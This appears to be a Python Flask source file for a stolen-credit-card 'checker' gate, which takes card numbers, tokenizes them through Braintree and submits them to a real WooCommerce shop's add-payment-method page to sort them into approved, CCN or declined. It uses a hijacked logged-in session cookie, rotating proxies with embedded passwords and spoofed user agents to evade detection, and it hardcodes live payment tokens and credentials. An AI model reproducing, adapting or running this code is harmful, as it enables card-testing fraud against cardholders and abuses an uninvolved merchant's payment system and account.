import re
import requests
import random
import uuid
from flask import Flask, jsonify
from bs4 import BeautifulSoup
import json as json_module
import time
from urllib.parse import urlparse
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# List of proxies to rotate - properly formatted
proxies_list = [
    {'http': 'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@sg-sin.pvdata.host:8080', 
     'https': 'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@sg-sin.pvdata.host:8080'},
    {'http': 'http://brad:bradhqcc@tits.oops.wtf:6969', 
     'https': 'http://brad:bradhqcc@tits.oops.wtf:6969'},
    {'http': 'http://sssssss:sssssssssssssssssssssss@tits.oops.wtf:6969', 
     'https': 'http://sssssss:sssssssssssssssssssssss@tits.oops.wtf:6969'}
]

# User agents list
uaa = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
]

# Approved patterns
approved_patterns = [
    'Nice! New payment method added',
    'Payment method successfully added.',
    'Insufficient Funds',
    'Gateway Rejected: avs',
    'Duplicate',
    'Payment method added successfully',
    'Invalid postal code or street address',
    'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds',
    'succeeded',
    'setup_intent'
]

# CCN patterns
CCN_patterns = [
    'CVV',
    'Gateway Rejected: avs_and_cvv',
    'Card Issuer Declined CVV',
    'Gateway Rejected: cvv',
    "Your card's security code is incorrect"
]

# Create a session for connection pooling
session = requests.Session()
session.verify = False  # Disable SSL verification for the session

def requests_with_retry(method, url, max_retries=2, **kwargs):
    """Makes a request with proxy rotation and retries."""
    last_error = None
    # Shuffle proxies to try a different one first each time
    shuffled_proxies = random.sample(proxies_list, len(proxies_list))
    
    for attempt in range(max_retries):
        proxy = shuffled_proxies[attempt % len(shuffled_proxies)]
        try:
            # Make sure we're using the right proxy protocol for the URL
            parsed_url = urlparse(url)
            if parsed_url.scheme == 'https':
                # For HTTPS URLs, use the HTTPS proxy if available, otherwise fall back to HTTP proxy
                if 'https' in proxy and proxy['https']:
                    actual_proxy = proxy
                else:
                    actual_proxy = {'http': proxy.get('http', ''), 'https': proxy.get('http', '')}
            else:
                actual_proxy = proxy
                
            response = session.request(
                method, 
                url, 
                proxies=actual_proxy, 
                timeout=8,  # Reduced timeout for faster processing
                **kwargs
            )
            response.raise_for_status()  # Raise an exception for bad status codes (4xx or 5xx)
            return response
        except (requests.exceptions.ProxyError, 
                requests.exceptions.ConnectTimeout, 
                requests.exceptions.ConnectionError,
                requests.exceptions.ReadTimeout,
                requests.exceptions.HTTPError,
                requests.exceptions.SSLError) as e:
            last_error = e
            print(f"Attempt {attempt + 1} failed with proxy {proxy}: {e}. Retrying...")
            # Reduced delay between retries
            time.sleep(0.5)
            continue
            
    # If all retries fail, try without proxy as a last resort
    try:
        print("All proxies failed, trying without proxy...")
        response = session.request(
            method, 
            url, 
            timeout=8,  # Reduced timeout
            **kwargs
        )
        response.raise_for_status()
        return response
    except Exception as e:
        print(f"Request without proxy also failed: {e}")
        # If all attempts fail, raise the last error
        raise last_error

def process_payment(cc, mm, yy, cvv):
    try:
        # Select random user agent
        ua = random.choice(uaa)
        
        # Step 1: Tokenize the card with Braintree
        headers = {
            'accept': '*/*',
            'accept-language': 'en-GB',
            'authorization': 'Bearer eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NjQ1NTczMDIsImp0aSI6IjU2MDg3NjQwLTZlMjAtNDNkOC1iMzczLTI5YTYxNDk2ZTVjZSIsInN1YiI6InJqeHpqdG40OWptYzJtbTMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InJqeHpqdG40OWptYzJtbTMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIiwiQnJhaW50cmVlOkFYTyJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJsb3ZlZGFnYWlubWVkaWFfaW5zdGFudCIsInBheXBhbF9jbGllbnRfaWQiOiJBZHdOalplLUtkeGZNcEFTc3NhaUNIdV82bWQ2S2lYcXdpQk9tUENmeDJKYm9jYl9IQkI4YVBFTjFrV2tydkpOXzZ2dmJqcFlhQ0w4OWdVMSJ9fQ.PmLOpgapJgaJCikf76abXKw27QRmthrwdZb34iO2AimzNdvgsbc3IJaeqgyrmQBFnq5HbEsPGQx5COsgotI55w',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'priority': 'u=1, i',
            'referer': 'https://assets.braintreegateway.com/',
            'save-data': 'on',
            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': ua,
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'dropin2',
                'sessionId': str(uuid.uuid4()),
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvv,
                        'billingAddress': {
                            'postalCode': '10001',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        r = requests_with_retry('POST', 'https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        t = r.json()
        
        if 'data' not in t or 'tokenizeCreditCard' not in t['data'] or 'token' not in t['data']['tokenizeCreditCard']:
            return {
                'status': 'Error',
                'response': 'Failed to tokenize card: ' + t.get('errors', [{}])[0].get('message', 'Unknown error')
            }
            
        tok = t['data']['tokenizeCreditCard']['token']

        # Step 2: Submit token to WooCommerce
        cookies = {
            '_fbp': 'fb.1.1760784423991.8067735593',
            'pysAddToCartFragmentId': '',
            '_ga': 'GA1.1.679663780.1760784425',
            'pys_advanced_form_data': '{%22first_name%22:%22%22%2C%22last_name%22:%22%22%2C%22email%22:%22xcracker663@gmail.com%22%2C%22phone%22:%22%22%2C%22fns%22:[]%2C%22lns%22:[]%2C%22emails%22:[%22xcracker663@gmail.com%22%2C%22xcragsgwhwh3@gmail.com%22%2C%22xcracker6636263@gmail.com%22]%2C%22phones%22:[]}',
            '_ga_SKX4MWPJWN': 'GS2.1.s1760784425$o1$g1$t1760784834$j60$l0$h0',
            'pys_session_limit': 'true',
            'pys_first_visit': 'true',
            'pysTrafficSource': 'direct',
            'pys_landing_page': 'https://lovedagainmedia.com/my-account',
            'last_pysTrafficSource': 'direct',
            'groundhogg-lead-source': 'https://lovedagainmedia.com/my-account',
            'groundhogg-tracking': 'Zk83QVlFUE42S1ZlY1hKc0RFMGZDZHB2enFuSFRCdFkvSlJwYmo1eGxYST0%3D',
            'breeze_folder_name': 'c3a41d9da7d57477427097787121b1a974371ed3',
            'wordpress_logged_in_ef622a6d6df3290e271fd50a256d6fba': '38b85d2599b8cf42a1a0d342b%7C1765680437%7CP3gE5ss0KbZnL0QmDsQFpHUY1vHk7NcQRuKnsU9kAC6%7Cf0f6bcdbff1efb563556b422aadeec78c727a50993740aa479d9a79d813cbaf4',
            'mcfw-wp-user-cookie': 'NjcyODU0fDB8NjN8NjgwX2Q4NGNiNmNiZWViZTQxMTJhZDMzMGU5ZTMyZTYyMThlNGU5NzQzOGVjMWZhY2FjNzk3ZTQ2YjYyZWE0MjZjYWU%3D',
            '_gcl_au': '1.1.11265940.1760784423.822680999.1764470806.1764470949',
            'PHPSESSID': '3ftpunkmdsasb40i5vvvt71b2e',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-11-30%2002%3A48%3A39%7C%7C%7Cep%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method%7C%7C%7Crf%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method',
            'sbjs_first_add': 'fd%3D2025-11-30%2002%3A48%3A39%7C%7C%7Cep%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method%7C%7C%7Crf%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Mobile%20Safari%2F537.36',
            'pys_start_session': 'true',
            'last_pys_landing_page': 'https://lovedagainmedia.com/my-account/payment-methods',
            'sbjs_session': 'pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method',
            'groundhogg-page-visits': '[["/my-account/payment-methods",[[1764470890,1],[1764472726,1]]],["/my-account/add-payment-method",[[1764470908,1],[1764470972,1],[1764472738,1]]]]',
        }

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-GB',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://lovedagainmedia.com',
            'Referer': 'https://lovedagainmedia.com/my-account/add-payment-method',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': ua,
            'save-data': 'on',
            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }

        data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': tok,
            'braintree_cc_device_data': '{"correlation_id": "' + str(uuid.uuid4()) + '"}',
            'braintree_cc_3ds_nonce_key': '',
            'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/rjxzjtn49jmc2mm3/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/rjxzjtn49jmc2mm3"},"merchantId":"rjxzjtn49jmc2mm3","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"rjxzjtn49jmc2mm3","supportedNetworks":["visa","mastercard","amex","discover"]},"fastlane":{"enabled":true,"tokensOnDemand":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["Visa","MasterCard","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Loved Again Media","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NjQ3MzE5MjEsImp0aSI6ImQ0YzRiN2M4LTlkYzktNGE5NC1hZjE3LWZhNDViYjc5MjE2MSIsInN1YiI6InJqeHpqdG40OWptYzJtbTMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InJqeHpqdG40OWptYzJtbTMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5Il0sIm9wdGlvbnMiOnt9fQ.lg2VxNdXfJPzuMO7M60Lowf9R9kNzax5HuWhXV7iJQSnUN3PC14Uj1f9xg9S9dGpb3kAucPxh9wuFtzSmpplgQ","paypalClientId":"AdwNjZe-KdxfMpASssaiCHu_6md6KiXqwiBOmPCfx2Jbocb_HBB8aPEN1kWkrvJN_6vvbjpYaCL89gU1","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"3336777698625192868","accessToken":"access_token$production$rjxzjtn49jmc2mm3$501425b5cb865ff22144901bb5a31794","environment":"production","enrichedCustomerDataEnabled":false},"paypalEnabled":true,"paypal":{"displayName":"Loved Again Media","clientId":"AdwNjZe-KdxfMpASssaiCHu_6md6KiXqwiBOmPCfx2Jbocb_HBB8aPEN1kWkrvJN_6vvbjpYaCL89gU1","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"lovedagainmedia_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
            'woocommerce-add-payment-method-nonce': '7faa5c039c',
            '_wp_http_referer': '/my-account/add-payment-method',
            'woocommerce_add_payment_method': '1',
            'apbct__email_id__elementor_form': '',
            'apbct_visible_fields': 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiIiwidmlzaWJsZV9maWVsZHNfY291bnQiOjAsImludmlzaWJsZV9maWVsZHMiOiJicmFpbnRyZWVfY2Nfbm9uY2Vfa2V5IGJyYWludHJlZV9jY19kZXZpY2VfZGF0YSBicmFpbnRyZWVfY2NfM2RzX25vbmNlX2tleSBicmFpbnRyZWVfY2NfY29uZmlnX2RhdGEgd29vY29tbWVyY2UtYWRkLXBheW1lbnQtbWV0aG9kLW5vbmNlIF93cF9odHRwX3JlZmVyZXIgd29vY29tbWVyY2VfYWRkX3BheW1lbnRfbWV0aG9kIGFwYmN0X19lbWFpbF9pZF9fZWxlbWVudG9yX2Zvcm0iLCJpbnZpc2libGVfZmllbGRzX2NvdW50Ijo4fX0=',
            'ct_bot_detector_event_token': '39d6ad2a7c6cebe4685f4bd5835a64c4db0d6b262761335b7bbed0dfb690384c',
        }

        ree = requests_with_retry('POST', 'https://lovedagainmedia.com/my-account/add-payment-method', cookies=cookies, headers=headers, data=data)
        
        # Parse response
        soup = BeautifulSoup(ree.text, 'html.parser')
        err = soup.find('div', class_='woocommerce-notices-wrapper')
        message = err.get_text(strip=True) if err else "Unknown error"
        rr = re.findall(r"Reason:\s*([^<\n\r]+)", ree.text)
        
        # Determine status based on response
        status = "Declined"
        response_text = message if message else (rr[0] if rr else "Unknown error")

        for pattern in approved_patterns:
            if pattern in response_text:
                status = "Approved"
                break
                
        for pattern in CCN_patterns:
            if pattern in response_text:
                status = "CCN"
                break
        
        return {
            'status': status,
            'response': response_text
        }
        
    except Exception as e:
        return {
            'status': 'Error',
            'response': f'All proxies failed or an unexpected error occurred. Last error: {str(e)}'
        }

@app.route('/gate=b3/cc=<cc_data>')
def gate_b3(cc_data):
    # Parse the credit card data
    pattern = r'^(\d{13,19})\|([0-1]\d)\|(\d{2}|\d{4})\|(\d{3,4})$'
    match = re.match(pattern, cc_data)
    
    if not match:
        return jsonify({
            'status': 'Error',
            'response': 'Invalid card format. Expected: cardnumber|mm|yy|cvv'
        })
    
    cc, mm, yy, cvv = match.groups()
    
    # Process the payment
    result = process_payment(cc, mm, yy, cvv)
    
    # Add 20-second delay after processing
    print("Processing complete. Waiting 20 seconds before responding...")
    time.sleep(20)
    
    return jsonify(result)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
